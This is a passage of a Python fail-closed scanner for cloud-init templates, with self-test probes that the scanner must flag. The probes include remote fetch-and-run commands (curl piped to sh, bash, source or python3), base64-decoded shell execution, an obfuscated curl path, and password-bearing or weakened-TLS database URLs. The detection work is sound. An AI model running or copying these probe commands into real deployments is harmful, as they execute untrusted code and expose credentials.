            # any text, and a use of it becomes the root use in expand_uses (#5329)
            if len(vals[m.group(1)]) > EXPAND_CAP:
                vals[m.group(1)] = {VALUES_PAST_CAP}
        for m in re.finditer(r"(?:^|[\s;&|(])for\s+([A-Za-z_]\w*)\s+in\s+([^;\n]*)", text):
            for wd in m.group(2).split():
                vals.setdefault(m.group(1), set()).add(unquote(wd)[0])
    texts = [tf_render(stmt) for _w, stmt, _st in stmts]
    refs, poisoned = nameref_facts(texts)
    if refs or poisoned:
        return {ANY_NAME: {VALUES_PAST_CAP}}
    # an IFS the gate cannot read leaves every split name unresolved in binary_vars, so
    # each operand through one is red there; here the fields are cut on the known IFS
    split, split_poisoned, seps = split_names(texts)
    cut = re.compile("[%s]+" % re.escape("".join(sorted(seps))))
    for k in split & set(vals):
        if split_poisoned:
            vals[k] = {VALUES_PAST_CAP}
        elif VALUES_PAST_CAP not in vals[k]:
            vals[k] = vals[k] | {f for v in vals[k] for f in cut.split(v) if f}
    return vals


EXPAND_CAP = 64
# the value set of a name assigned more than EXPAND_CAP texts (#5329)
VALUES_PAST_CAP = "\x00past-cap"
# the var_values key that stands for every name, past the cap (#5356)
ANY_NAME = "\x00any-name"


def expand_uses(uses: list, values: dict) -> list:
    """Each use with every plain $NAME / ${NAME} replaced by each value the template
    assigns NAME, to depth 4 (#5095). The original use stays, so an unknown or operator
    form still reads as a wildcard in use_glob. Past EXPAND_CAP variants, or through a
    name whose values passed the cap in var_values (#5329), the use becomes the root use
    "/", which runs_path reads as naming every path (fail closed, #5139: a bare wildcard
    is skipped there as naming no place, so it would drop the use)."""
    ref = re.compile(r"\$\{([A-Za-z_]\w*)\}|\$([A-Za-z_]\w*)")
    out = []
    for val, safe in uses:
        out.append((val, safe))
        if safe is True or "$" not in val:
            continue
        seen, todo, over = {val}, [val], False
        for _ in range(4):
            nxt = []
            for v in todo:
                m = next((x for x in ref.finditer(v) if ANY_NAME in values or (x.group(1) or x.group(2)) in values), None)
                if m is None:
                    continue
                reps = values.get(m.group(1) or m.group(2), values.get(ANY_NAME, set()))
                over = over or VALUES_PAST_CAP in reps
                for rep in reps - {VALUES_PAST_CAP}:
                    w = v[:m.start()] + rep + v[m.end():]
                    if w not in seen:
                        seen.add(w)
                        nxt.append(w)
            todo = nxt
            over = over or len(seen) > EXPAND_CAP
            if over:
                break
        if not over:
            out.extend((v, safe) for v in seen if v != val)
        else:
            out.append(("/", safe))
    return out


def binary_vars(stmts: list) -> frozenset:
    """Names the template may give the ai-memory binary's path (rule R4, #5094), to a
    fixpoint: an assignment, export, local or declare whose value is a binary reference,
    a substitution that names ai-memory (command -v, which, readlink, realpath ...) or
    expands a tracked name; and a for-loop variable whose list holds such a word."""
    out = set()
    assigns = []
    unknown = set()
    for _w, stmt, _st in stmts:
        text = tf_render(stmt)
        assigns.extend((m.group(1), m.group(2), text[m.start(2):])
                       for m in re.finditer(r"(?<![\w$])([A-Za-z_]\w*)(?:\[[^]]*\])?\+?=(\S*)", text))
        for m in re.finditer(r"(?:^|[\s;&|(])for\s+([A-Za-z_]\w*)\s+in\s+([^;\n]*)", text):
            assigns.extend((m.group(1), wd, wd) for wd in m.group(2).split())
            assigns.append((m.group(1), m.group(2), m.group(2)))
        for m in re.finditer(r"(?:^|[\s;&|(])(?:read|mapfile|readarray)\b([^;&|\n]*)", text):
            unknown.update(re.findall(r"(?<![\w$-])[A-Za-z_]\w*", m.group(1)))
        unknown.update(re.findall(r"\bprintf\s+-v\s*([A-Za-z_]\w*)", text))
        unknown.update(re.findall(r"\bgetopts\s+\S+\s+([A-Za-z_]\w*)", text))
        # an array, an append (+=) or a glob in the value is not the text the operand
        # expands to (#5219, #5174); namerefs are read by nameref_facts below
        for m in re.finditer(r"(?<![\w$])([A-Za-z_]\w*)(\[[^]]*\])?(\+?)=(\S*)", text):
            if m.group(2) or m.group(3) or m.group(4).startswith("(") or re.search(r"[*?\[]", m.group(4)):
                unknown.add(m.group(1))
    while True:
        n = len(out)
        for name, word, rest in assigns:
            if name in out:
                continue
            sub = re.match(r"""["']?(\$\(|`)""", rest)
            if sub:
                # the substitution's own text: up to its closing parenthesis or backtick
                rest = rest[sub.start(1):]
                depth, j = 0, 0
                if rest.startswith("`"):
                    j = rest.find("`", 1)
                    rest = rest if j < 0 else rest[:j + 1]
                else:
                    for j, ch in enumerate(rest):
                        depth += ch == "("
                        depth -= ch == ")"
                        if depth == 0 and ch == ")":
                            rest = rest[:j + 1]
                            break
            if (binary_ref(word.rstrip(";"), frozenset(out))
                    or (sub and re.search(r"(?<![\w.-])ai-memory(?![\w./-])", rest))
                    or any(re.search(r"\$\{?[#!]?" + re.escape(b) + r"(?!\w)", rest if sub else word) for b in out)):
                out.add(name)
        if len(out) == n:
            break
    # resolved names, to a fixpoint: every value is literal text and every expansion in it
    # is a positional parameter or a resolved name
    names = {a[0] for a in assigns}
    # a nameref target built from an expansion is refused for the whole template in
    # analyse, which is the one fail-closed path for it (#5330)
    refs = nameref_facts([tf_render(stmt) for _w, stmt, _st in stmts])[0]
    unknown |= refs | split_names([tf_render(stmt) for _w, stmt, _st in stmts])[0]
    resolved = set()
    while True:
        n = len(resolved)
        for name in names - resolved - unknown - out:
            vals = [a[1] for a in assigns if a[0] == name]
            if all("`" not in v and "$(" not in v
                   and all(r in resolved for r in re.findall(r"\$\{?[#!]?([A-Za-z_]\w*)", v)) for v in vals):
                resolved.add(name)
        if len(resolved) == n:
            break
    facts = VarFacts(out)
    facts.resolved = frozenset(resolved)
    return facts


def analyse(name: str, text: str, cache: dict):
    key = (name, text)
    if key not in cache:
        # the R5 reasons this scan adds are kept with the entry, so a scan answered from
        # the cache puts them back (#5439)
        saved = dict(R5_READ_AS_SCRIPT)
        R5_READ_AS_SCRIPT.clear()
        try:
            lines, hits, entries, stmts = classify(name, text)
            cache[("r5",) + key] = dict(R5_READ_AS_SCRIPT)
        finally:
            R5_READ_AS_SCRIPT.clear()
            R5_READ_AS_SCRIPT.update(saved)
        bins = binary_vars(stmts)
        comp = []
        for where, stmt, st in stmts:
            for why in companion_hits(tf_render(stmt), st, 0, bins):
                comp.append("%s: companion rule: %s" % (where, why))
            if re.search(r"(?<![\w$])TAR_OPTIONS(?!\w)", re.sub(r"[\"'\\]", "", tf_render(stmt))):
                # GNU tar reads options from TAR_OPTIONS too: a rename or program option
                # there is invisible to tar_risky, which reads argv (#5093 R11). Quotes and
                # backslashes are dropped first: export TAR_""OPTIONS=x sets the same name
                comp.append("%s: companion rule: %s" % (where, TAR_ENV_HIT))
            if built_name(tf_render(stmt)):
                comp.append("%s: companion rule: %s" % (where, BUILT_NAME_HIT))
        # a nameref whose target is built from an expansion can name TAR_OPTIONS too
        # (#5326); refused at the first statement that makes the namerefs poisoned
        texts = [tf_render(stmt) for _w, stmt, _st in stmts]
        if nameref_facts(texts)[1]:
            k = next((k for k in range(len(texts)) if nameref_facts(texts[:k + 1])[1]), len(texts) - 1)
            comp.append("%s: companion rule: nameref target built from an expansion (%s)"
                        % (stmts[k][0], BUILT_NAME_HIT))
        homes = service_homes(lines)
        trig = [ln for ln in lines if triggered(ln)]
        cache[key] = (lines, hits + comp, entries, trig, homes)
    for path, use in cache[("r5",) + key].items():
        R5_READ_AS_SCRIPT.setdefault(path, use)
    return cache[key]


def run_scan(templates: dict, maintfs: dict, allow_text: str, pending_text: str, known: set,
             autolist: bool = False, extra=(), cache=None):
    """Scan templates (name -> text). Returns (hits, faults, stats)."""
    cache = {} if cache is None else cache
    faults, hits = [], []
    if len(templates) < 2:
        faults.append("expected at least 2 templates, found %d" % len(templates))
    scopes = {}
    for nm in templates:
        sc = scope_of(nm)
        if sc in scopes:
            faults.append("two templates in one directory: %s and %s" % (scopes[sc], nm))
        scopes[sc] = nm
    allow = load_entries(allow_text, False, faults, "allow")
    pend = load_entries(pending_text, True, faults, "pending")
    if not allow:
        faults.append("allowlist is empty (fail closed)")
    seen = {}
    for e in allow + pend:
        k = (e[0], e[2], e[3])
        clash = [x for x in ((k,) + tuple((sc, e[2], e[3]) for sc in SCOPES if (sc == "both") != (e[0] == "both"))) if x in seen]
        if clash and (clash[0] != k or e[1] or seen[k].startswith("pending")):
            faults.append("duplicate entry %s | %s | %s (also at %s)" % (e[0], e[2], scrub(e[3])[:50], seen[clash[0]]))
        seen[k] = "%s:%d" % ("pending" if e[1] else "allow", e[4])
    approved = {(e[0], e[2], e[3]) for e in allow}
    pending = {(e[0], e[2], e[3]) for e in pend}
    approved |= {(s, c, t) for s, c, t in extra}
    expected = {}
    for e in allow:
        for sc in (sorted(scopes) if e[0] == "both" else [e[0]]):
            expected.setdefault((sc, e[2]), []).append(e[3])
    actual = {}
    used = {}
    ntrig = 0
    for nm, text in sorted(templates.items()):
        sc = scope_of(nm)
        hits.extend(rules_1_to_4(nm, text, known))
        for u in userdata_hits(nm, sc, text, maintfs.get(sc)):
            (faults if u.startswith("FAULT:") else hits).append(u[6:] if u.startswith("FAULT:") else u)
        lines, phits, entries, trig, homes = analyse(nm, text, cache)
        binaries = {m.group(1) for m in (re.match(r"^\s*Exec\w*=\s*[-@+!:]*(/\S+)", x.joined) for x in lines if x.kind == "unit") if m}
        hits.extend(phits)
        if not trig:
            faults.append("%s: zero triggered lines (fail closed)" % nm)
        ntrig += len(trig)
        sp = entries.get(STORE_URL_PATH)
        if sp is not None and sp.get("permissions") != "'0600'":
            hits.append("%s: %s has no permissions: '0600'" % (nm, STORE_URL_PATH))
        for reg in tf_regions(text):
            actual.setdefault((sc, "tf-region"), []).append(reg)
        for ln in trig:
            keys = [(sc, ln.ctx, ln.text), ("both", ln.ctx, ln.text)]
            if not any(k in pending for k in keys):
                actual.setdefault((sc, ln.ctx), []).append(ln.text)
            hit_a = next((k for k in keys if k in approved), None)
            hit_p = next((k for k in keys if k in pending), None)
            if hit_a is None and hit_p is None:
                if autolist:
                    approved.add(keys[0])
                    hit_a = keys[0]
                else:
                    hits.append("%s:%d: line not in the allowlist: %s | %s | %s" % (nm, ln.first, sc, ln.ctx, scrub(ln.text)[:160]))
                    continue
            k = hit_a or hit_p
            used.setdefault(k, set()).add(sc)
            if hit_a is not None:
                for why in validate_line(ln, homes, binaries):
                    hits.append("%s:%d: %s" % (nm, ln.first, why))
    for e in pend:
        k = (e[0], e[2], e[3])
        need = set(scopes) if e[0] == "both" else {e[0]}
        got = used.get(k, set())
        if not need <= got:
            what = "pending" if e[1] else "allow"
            hits.append("%s:%d: stale entry (matches nothing in %s): %s | %s" % (what, e[4], ",".join(sorted(need - got)), e[2], scrub(e[3])[:80]))
    for key in sorted(set(expected) | set(actual)):
        if key[0] not in scopes or autolist:
            continue
        want, got = expected.get(key, []), actual.get(key, [])
        if want != got:
            k = next((i for i, (x, y) in enumerate(zip(want, got)) if x != y), min(len(want), len(got)))
            hits.append("%s | %s: triggered lines differ from the allowlist order at item %d (allow %d, template %d): allow=%r template=%r"
                        % (key[0], key[1], k + 1, len(want), len(got), scrub((want[k:k + 1] or [""])[0])[:70], scrub((got[k:k + 1] or [""])[0])[:70]))
    stats = {"templates": len(templates), "allow": len(allow), "pending": len(pend), "triggered": ntrig}
    return hits, faults, stats


def list_triggers(templates: dict, cache: dict) -> list:
    out = []
    for nm, text in sorted(templates.items()):
        lines, _, _, trig, _ = analyse(nm, text, cache)
        for ln in trig:
            out.append("%s | %s | %s" % (scope_of(nm), ln.ctx, ln.text))
    return out


def load_repo():
    templates = {}
    for p in sorted(ROOT.glob(TEMPLATE_GLOB)):
        templates[str(p.relative_to(ROOT))] = p.read_text(encoding="utf-8")
    maintfs = {}
    for nm in templates:
        mt = ROOT / posixpath.dirname(nm) / "main.tf"
        if mt.is_file():
            maintfs[scope_of(nm)] = mt.read_text(encoding="utf-8")
    allow = ALLOW_FILE.read_text(encoding="utf-8") if ALLOW_FILE.is_file() else ""
    pend = PENDING_FILE.read_text(encoding="utf-8") if PENDING_FILE.is_file() else ""
    return templates, maintfs, allow, pend


def build_parser() -> argparse.ArgumentParser:
    ap = argparse.ArgumentParser(description="#4616/#4657 cloud-init memory templates: fail-closed token allowlist")
    g = ap.add_mutually_exclusive_group()
    g.add_argument("--self-test", action="store_true", help="prove the rules are red on probes and green on clean lines")
    g.add_argument("--list-triggers", action="store_true", help="print every triggered line as an allowlist entry")
    return ap


# ---------------------------------------------------------------- self-test
# Built by concatenation so this file carries no literal flag-plus-DSN (#4577 gate).
SU = "--store-" + "url"
PG = "postgres" + "://"
PW = "ProbePlaceholder1"
BIN = "/usr/local/lib/ai-memory/bin/ai-memory"
PROV_PATH = "/usr/local/sbin/ai-memory-provision.sh"
UNIT_PATH = "/etc/systemd/system/ai-memory.service"
EXEC = "ExecStart=" + BIN + " serve --host 0.0.0.0"
ENVF = "      Environment=AI_MEMORY_STORE_URL_FILE=/etc/ai-memory/store-url\n"
PROV = "  - path: " + PROV_PATH + "\n"
UNIT_ENTRY = "  - path: " + UNIT_PATH + "\n"
EXT = "      sudo -u postgres psql -d aimemory -c \"CREATE EXTENSION IF NOT EXISTS vector;\"\n"
RELOAD = "      systemctl daemon-reload\n"
CHMOD = "      chmod 0600 /etc/ai-memory/store-url\n"
AGE = "        fetch_pinned https://github.com/apache/age.git /opt/age-src \"$AGE_COMMIT\"\n"
PIN = "AGE_COMMIT=e43dc1a12b78fba4acef9835b2b10379b8d243b4"
DSNFILE = PG + "aimemory:CHANGEME@localhost/aimemory?sslmode=verify-full&sslrootcert=/etc/ai-memory/tls/pg-ca.crt"
DSN = PG + "aimemory:" + PW + "@localhost/aimemory?sslmode=verify-full"
NOPW = PG + "aimemory@localhost/aimemory?sslmode=verify-full"
RUNCMD = "  - [bash, " + PROV_PATH + "]\n"
STORE_PERM = "  - path: /etc/ai-memory/store-url\n    permissions: '0600'\n"


def wf(path, mode, body):
    """A write_files entry inserted before the provision script entry."""
    out = ["  - path: " + path, "    permissions: '" + mode + "'", "    content: |"] + ["      " + b for b in body]
    return "\n".join(out) + "\n" + PROV


def ins(anchor, lines, before=False):
    """Insert provision-script lines (6-space indent) after (or before) anchor."""
    block = "".join("      " + x + "\n" for x in lines)
    return (anchor, block + anchor) if before else (anchor, anchor + block)


def build_probes() -> list:
    """(label, expect, spec). expect: red (a defect hit), green, fault (rc 2).
    spec keys: aws/do (mutations), autolist, extra, allow/pend (text edits),
    templates (replace the set), maintf (aws main.tf text)."""
    P = []

    def red(label, muts, autolist=True, **kw):
        P.append((label, "red", dict(aws=muts, autolist=autolist, **kw)))

    def green(label, muts, autolist=False, **kw):
        P.append((label, "green", dict(aws=muts, autolist=autolist, **kw)))

    # ---- security reviewer round 1 (#4662/#4663/#4664) and round 2 (#4687-#4693)
    red("S-R1 runtime argv via sh -c", [(EXEC, "ExecStart=/bin/sh -c 'exec " + BIN + " serve " + SU + " \"$(cat /etc/ai-memory/store-url)\" --host 0.0.0.0'")])
    red("S-R2 password= query on serve", [(EXEC, EXEC.replace("serve", "serve " + SU + " " + NOPW.replace("?", "?password=" + PW + "&")))])
    red("S-R3 Environment= DSN in a 0644 unit", [(ENVF, "      Environment=AI_MEMORY_STORE_URL=" + DSN + "\n")])
    red("S-R4 psql DSN on the argv in provision", [ins(EXT, ["psql \"" + PG + "aimemory:$DB_PASS@localhost/aimemory?sslmode=verify-full\" -c \"SELECT 1\""])])
    red("S-R5 literal userinfo DSN on serve", [(EXEC, EXEC.replace("serve", "serve " + SU + " " + DSN))])
    red("S-N1 EnvironmentFile holding AI_MEMORY_STORE_URL=", [(PROV, wf("/etc/ai-memory/env", "0600", ["AI_MEMORY_STORE_URL=" + DSN]))])
    red("S-N2 AI_MEMORY_STORE_URL with a space before = (#4689)", [(PROV, wf("/etc/default/ai-memory", "0644", ["AI_MEMORY_STORE_URL =" + DSN]))])
    red("S-N3 drop-in ExecStart with the store flag", [(PROV, wf("/etc/systemd/system/ai-memory.service.d/10-store.conf", "0644", ["[Service]", "ExecStart=", EXEC + " --port 9077 --tls-cert /a --tls-key /b " + SU + " " + DSN]))])
    red("S-N4 drop-in Environment=PGPASSWORD (#4687)", [(PROV, wf("/etc/systemd/system/ai-memory.service.d/10-pw.conf", "0644", ["[Service]", "Environment=PGPASSWORD=" + PW]))])
    red("S-N5 unit Environment=PGPASSWORD (#4687)", [(ENVF, ENVF + "      Environment=PGPASSWORD=" + PW + "\n")])
    red("S-N6 wrapper script the unit executes", [(PROV, wf("/usr/local/bin/ai-memory-run", "0755", ["#!/bin/sh", "exec " + BIN + " serve " + SU + " \"$(cat /etc/ai-memory/store-url)\" \"$@\""]))])
    red("S-N7 wrapper at the binary path, flag split by a variable (#4693)", [ins(RELOAD, ["printf '%s\\n' '#!/bin/sh' 'F=--store' 'exec " + BIN + ".real \"$@\" \"$F-url\" \"$(cat /etc/ai-memory/store-url)\"' > " + BIN], before=True)])
    red("S-N8 systemd-run serve with the store flag", [ins(RELOAD, ["systemd-run --uid=aimemory " + BIN + " serve --host 127.0.0.1 " + SU + " \"$(cat /etc/ai-memory/store-url)\""], before=True)])
    red("S-N9 systemd-run, store flag split by quoting (#4693)", [ins(RELOAD, ["systemd-run --uid=aimemory " + BIN + " serve --host 127.0.0.1 --sto\"re-u\"rl \"$(cat /etc/ai-memory/store-url)\""], before=True)])
    red("S-N10 ExecStart store flag split by quoting", [(EXEC, EXEC.replace("serve", "serve --sto\"re-u\"rl /x"))])
    red("S-N11 ExecStart unbraced $VAR argument list", [(ENVF, ENVF + "      EnvironmentFile=/etc/ai-memory/args\n"), (EXEC, EXEC.replace("serve", "serve $$STORE_ARGS"))])
    P.append(("S-N12 braced $${VAR} as a --host value (benign)", "green", dict(aws=[(ENVF, ENVF + "      EnvironmentFile=/etc/ai-memory/args\n"), (EXEC, EXEC.replace("--host 0.0.0.0", "--host $${H}"))], autolist=True, core=True)))
    red("S-N13 pg_isready -d DSN", [ins(EXT, ["pg_isready -d \"" + PG + "aimemory:$DB_PASS@localhost/aimemory?sslmode=verify-full\""])])
    red("S-N14 pg_dump --dbname=DSN (#4690)", [ins(EXT, ["pg_dump --dbname=" + PG + "aimemory:$${DB_PASS}@localhost/aimemory?sslmode=verify-full -f /dev/null"])])
    red("S-N15 psql percent-encoded pass%77ord= key (#4691)", [ins(EXT, ["psql \"" + PG + "aimemory@localhost/aimemory?sslmode=verify-full&pass%77ord=$DB_PASS\" -c \"SELECT 1\""])])
    red("S-N16 psql keyword conninfo password= (#4692)", [ins(EXT, ["psql \"host=localhost dbname=aimemory user=aimemory password=$DB_PASS sslmode=verify-full\" -c \"SELECT 1\""])])
    red("S-N17 lax-permission opt-out with a 0644 store-url (#4688)", [(ENVF, ENVF + "      Environment=AI_MEMORY_STORE_URL_FILE_ALLOW_LAX_PERMS=1\n"), (CHMOD, CHMOD.replace("0600", "0644"))])
    # ---- code reviewer round 1 and round 2 (#4657, #4682-#4685)
    red("C-R1 git -C checkout of a branch", [(AGE, "        git init -q /opt/age-src && git -C /opt/age-src remote add origin https://github.com/apache/age.git\n        git -C /opt/age-src fetch -q origin release/PG18/1.8.0\n        git -C /opt/age-src checkout -q FETCH_HEAD\n")], autolist=False)
    red("C-R1 fetch_pinned without rev-parse", [("          && [ \"$(git -C \"$2\" rev-parse HEAD)\" = \"$3\" ] \\\n", "")], autolist=False)
    red("C-R1 fetch_pinned with a branch literal", [("\"$AGE_COMMIT\"", "release/PG18/1.8.0")], autolist=False)
    red("C-R1 weak DSN through Environment=", [(ENVF, "      Environment=AI_MEMORY_STORE_URL=" + PG + "aimemory:x@localhost/aimemory\n")])
    red("C-R1 unknown short flag", [("serve --host 0.0.0.0", "serve -b 0.0.0.0:9077 --host 0.0.0.0")])
    red("C-R1 systemd ${VAR} serve argument", [("--port 9077", "--port 9077 $${EXTRA_SERVE_FLAGS}")])
    red("C-N01 git through a variable", [ins(AGE, ["  GIT=git; $GIT -C /opt/age-src fetch -q origin master && $GIT -C /opt/age-src checkout -q FETCH_HEAD"])])
    red("C-N02 git through an alias", [ins(AGE, ["  shopt -s expand_aliases; alias g=git", "  g -C /opt/age-src fetch -q origin master"])], autolist=False)
    red("C-N03 git by absolute path", [(AGE, "        /usr/bin/git clone -q https://github.com/apache/age.git /opt/age-src\n")], autolist=False)
    red("C-N04 quoted git clone", [(AGE, "        \"git\" clone -q https://github.com/apache/age.git /opt/age-src\n")], autolist=False)
    red("C-N05 git clone --branch", [(AGE, "        git clone -q --branch master https://github.com/apache/age.git /opt/age-src\n")], autolist=False)
    red("C-N06 curl piped to a shell (#4682)", [ins(AGE, ["  curl -fsSL https://example.invalid/install.sh | sh"])])
    red("C-N07 moving tarball through curl|tar (#4682)", [(AGE, "        mkdir -p /opt/age-src && curl -fsSL https://github.com/apache/age/archive/refs/heads/master.tar.gz | tar -xz -C /opt/age-src --strip-components=1\n")])
    red("C-N08 fetch_pinned with a short ref", [("\"$AGE_COMMIT\"", "e43dc1a")], autolist=False)
    red("C-N09 short AGE_COMMIT", [(PIN, "AGE_COMMIT=e43dc1a")], autolist=False)
    red("C-N10 non-hex AGE_COMMIT", [(PIN, "AGE_COMMIT=" + "g" * 40)], autolist=False)
    red("C-N11 pin read from the network (#4683)", [ins(AGE, ["  read -r AGE_COMMIT < <(curl -fsS https://example.invalid/head)"], before=True)], autolist=False)
    red("C-N12 pin through printf -v (#4683)", [ins(AGE, ["  printf -v AGE_COMMIT %s \"$(curl -fsS https://example.invalid/head)\""], before=True)], autolist=False)
    red("C-N13 pin through += (#4683)", [ins(AGE, ["  AGE_COMMIT+=x"], before=True)], autolist=False)
    red("C-N14 fetch_pinned redefined", [ins(AGE, ["  fetch_pinned() { git clone \"$1\" \"$2\"; }"], before=True)], autolist=False)
    red("C-N15 fetch_pinned redefined with function", [ins(AGE, ["  function fetch_pinned { git clone \"$1\" \"$2\"; }"], before=True)], autolist=False)
    red("C-N16 fetch_pinned shadowed by an alias", [ins(AGE, ["  alias fetch_pinned=true"], before=True)], autolist=False)
    red("C-N17 serve line built by printf in sh -c", [(EXEC, "ExecStart=/bin/sh -c \"$(printf '%s serve --bind 0.0.0.0:9077' " + BIN + ")\"")])
    red("C-N18 serve line hidden behind eval", [(EXEC, "ExecStart=/bin/sh -c 'eval \"$CMD\"'")])
    red("C-N19 drop-in through a heredoc", [ins(RELOAD, ["mkdir -p /etc/systemd/system/ai-memory.service.d", "cat > /etc/systemd/system/ai-memory.service.d/10-x.conf <<'UNIT'", "[Service]", "ExecStart=", "ExecStart=" + BIN + " serve --bind 0.0.0.0:9077", "UNIT"], before=True)], autolist=False)
    red("C-N20 drop-in through a printf one-liner (#4684)", [ins(RELOAD, ["mkdir -p /etc/systemd/system/ai-memory.service.d", "printf '[Service]\\nExecStart=\\nExecStart=" + BIN + " serve --bind 0.0.0.0:9077\\n' > /etc/systemd/system/ai-memory.service.d/10-x.conf"], before=True)], autolist=False)
    red("C-N21 EnvironmentFile carrying AI_MEMORY_STORE_URL", [(UNIT_ENTRY, "  - path: /etc/ai-memory/env\n    permissions: '0600'\n    content: |\n      AI_MEMORY_STORE_URL=" + NOPW + "\n" + UNIT_ENTRY)])
    red("C-N22 drop-in by a write_files entry", [(UNIT_ENTRY, "  - path: /etc/systemd/system/ai-memory.service.d/override.conf\n    content: |\n      [Service]\n      ExecStart=\n      ExecStart=" + BIN + " serve --bind 0.0.0.0:9077 --tls-cert /a --tls-key /b\n" + UNIT_ENTRY)])
    red("C-N23 drop-in with a weak Environment URL", [(UNIT_ENTRY, "  - path: /etc/systemd/system/ai-memory.service.d/override.conf\n    content: |\n      [Service]\n      Environment=AI_MEMORY_STORE_URL=" + PG + "aimemory@localhost/aimemory\n" + UNIT_ENTRY)])
    red("C-N24 trailing blanks after a continuation backslash", [("--port 9077 ", "--port 9077 \\   \n        --bind 0.0.0.0:9077 ")])
    red("C-N25 SSLMODE upper-case key (#4685)", [(DSNFILE, DSNFILE.replace("sslmode=", "SSLMODE="))])
    red("C-N26 percent-encoded key override ssl%6Dode=disable (#4685)", [(DSNFILE, DSNFILE + "&ssl%6Dode=disable")])
    red("C-N27 percent-encoded sslmode value", [(DSNFILE, DSNFILE.replace("verify-full", "verify%2Dfull"))])
    red("C-N28 trailing weak sslmode", [(DSNFILE, DSNFILE + "&sslmode=require")])
    red("C-N30 unknown launcher before serve", [(EXEC, EXEC.replace("ExecStart=/usr", "ExecStart=/usr/bin/nice -n 5 /usr"))])
    red("C-N31 postgresql:// with sslmode=require", [(DSNFILE, DSNFILE.replace(PG, "postgresql://").replace("verify-full", "require"))])
    # ---- condition 6: trigger matching
    red("T6 case-varied trigger word", [ins(RELOAD, ["echo PoStGrEs"])], autolist=False)
    red("T6 percent-encoded trigger word", [ins(RELOAD, ["echo p%6Fstgres"])], autolist=False)
    red("T6 every script line is approved (no vocabulary)", [ins(RELOAD, ["echo hello"])], autolist=False)
    red("T6 add-apt-repository with a neutral argument", [ins(RELOAD, ["add-apt-repository -y ppa:someone/foo"])], autolist=False)
    red("T6 wget2 with a neutral argument", [ins(RELOAD, ["wget2 -O f example.com/x"])], autolist=False)
    red("T6 sslmode=Verify-Full", [(DSNFILE, DSNFILE.replace("verify-full", "Verify-Full"))])
    red("T6 sslmode missing", [(DSNFILE, DSNFILE.replace("sslmode=verify-full&", ""))])
    # ---- condition 2: companion rule
    for lbl, cmd in (("eval", "eval \"$X\""), ("base64 decode into a shell", "echo Zm9v | base64 -d | bash"),
                     ("base64 decode then a shell in one statement", "echo Zm9v | base64 -d > /x && bash /x"),
                     ("xxd -r then a shell in one statement", "xxd -r -p /y > /x; sh /x"),
                     ("ANSI-C quoting", "$'\\x63url' https://e"), ("$-variable in command position", "$X -fsSL https://e"),
                     ("command substitution in command position", "$(printf cu)rl https://e"),
                     ("backtick in command position", "`printf cu`rl https://e"),
                     ("sudo wrapper of a variable", "sudo -u aimemory $X"), ("env wrapper of a variable", "env A=1 $X"),
                     ("runuser -c expanded script", "runuser -u aimemory -- bash -c \"$X\""),
                     ("here-string into bash", "bash <<< \"$X\""), ("process substitution into bash", "bash <(curl -fsS https://e)"),
                     ("source of a substitution", "source <(curl -fsS https://e)"), ("pipe into python", "curl -fsS https://e | python3"),
                     ("nested sh -c eval", "sh -c 'eval x'"), ("timeout wrapper of a variable", "timeout 5 $X"),
                     ("xargs into a shell", "echo x | xargs sh"), ("unparsable quote", "echo \"$(foo")):
        red("C2 companion: " + lbl, [ins(RELOAD, [cmd], before=True)])
    red("C2 companion in a runcmd flow list", [(RUNCMD, RUNCMD + "  - [bash, -c, \"eval $X\"]\n")])
    red("C2 companion in a runcmd string item", [(RUNCMD, RUNCMD + "  - $X -fsSL https://e\n")])
    red("C2 companion in an unquoted heredoc substitution", [ins(RELOAD, ["cat > /etc/x.conf <<EOF", "a=$(eval x)", "EOF"], before=True)])
    red("C2 quoted heredoc body is companion-checked like a data block", [ins(RELOAD, ["cat > /etc/x.conf <<'EOF'", "a=$(eval x)", "EOF"], before=True)])
    red("C2 unit ExecStartPre sh -c eval", [(ENVF, ENVF + "      ExecStartPre=/bin/sh -c 'eval \"$PRE\"'\n")])
    red("C2 glob command word", [ins(RELOAD, ["/???/???/c?rl -sSo f x.example/p"], before=True)], autolist=False)
    red("O approved line moved after another", [(RELOAD, ""), ("      systemctl enable --now ai-memory\n", "      systemctl enable --now ai-memory\n" + RELOAD)], autolist=False)
    red("O approved line repeated", [ins(RELOAD, ["chmod 0600 /etc/ai-memory/store-url"], before=True)], autolist=False)
    red("O exit 0 before approved lines", [ins(RELOAD, ["exit 0"], before=True)], autolist=False)
    red("O approved line wrapped in if false", [ins(RELOAD, ["if false; then"], before=True)], autolist=False)
    # ---- round 3 (#4784-#4786, #4793-#4795): every probe of both reviewers is a permanent case
    sha = ('      echo "${ai_memory_image_sha256}  $DL/ai-memory.tar.gz" | sha256sum -c - \\\n'
           '        || { echo "ai-memory tarball digest mismatch"; rm -f "$DL/ai-memory.tar.gz"; exit 1; }\n')
    tar_x = '      tar -xzf "$DL/ai-memory.tar.gz" --no-same-owner -C "$DL/x" ai-memory\n'
    swap = ('        [ -z "$(swapon --show --noheadings)" ] \\\n'
            '          || { echo "swap is active: refusing to write the CA key"; exit 1; }\n')
    member = ('      [ -f "$DL/x/ai-memory" ] && [ ! -L "$DL/x/ai-memory" ] \\\n'
              '        || { echo "tarball member ai-memory is not a regular file"; exit 1; }\n')
    owner = ('      [ "$(stat -c %U /opt/ai-memory)" = aimemory ] \\\n'
             '        || { echo "/opt/ai-memory is not owned by aimemory"; exit 1; }\n')
    hba = '            "hostnossl aimemory aimemory all reject"\n'
    inst = '      install -o root -g root -m 0755 "$DL/x/ai-memory" /usr/local/lib/ai-memory/bin/ai-memory\n'
    curl_bin = '      curl -fsSL "${ai_memory_image_url}" -o "$DL/ai-memory.tar.gz"\n'
    unit_exec = "      ExecStart=/usr/local/lib/ai-memory/bin/ai-memory serve"
    daemon_env = "      Environment=AI_MEMORY_STORE_URL_FILE=/etc/ai-memory/store-url\n"
    dec = "      systemctl daemon-reload\n"
    mk = "        make install PG_CONFIG=/usr/bin/pg_config\n"
    home = "      # --- user + dirs ---\n"
    sec = [
        ("P1 tf %{if false} around the digest check", [(sha, "%{ if false }\n" + sha + "%{ endif }\n")]),
        ("P2 sh if false around the digest check", [(sha, "      if false; then\n" + sha + "      fi\n")]),
        ("P3 digest check moved after the install", [(sha, ""), (inst, inst + sha)]),
        ("P4 lone CR turns a comment into a command", [(home, home.rstrip("\n") + "\r      chmod 0644 /etc/ai-memory/store-url\n")]),
        ("P5 pg_conftool listen_addresses", [ins(RELOAD, ["pg_conftool 18 main set listen_addresses '*'"], before=True)]),
        ("P6 swap check under if false", [(swap, "        if false; then\n" + swap + "        fi\n")]),
        ("P7 header changed to a shell shebang", [("#cloud-config\n", "#!/bin/bash\n")]),
